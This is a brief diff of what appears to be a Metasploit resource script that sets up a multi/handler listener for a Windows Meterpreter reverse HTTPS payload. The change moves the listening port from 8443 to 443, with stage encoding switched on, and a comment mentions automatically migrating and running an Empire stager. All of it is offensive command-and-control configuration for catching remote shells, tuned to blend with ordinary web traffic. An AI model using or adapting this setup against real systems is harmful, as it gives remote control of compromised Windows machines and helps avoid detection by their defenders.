@@ -4,7 +4,7 @@
 use multi/handler
 set PAYLOAD windows/meterpreter/reverse_https
 set LHOST 0.0.0.0
-set LPORT 8443
+set LPORT 443
 set EnableStageEncoding true 
 
 # Automatically migrate and then run Empire stager
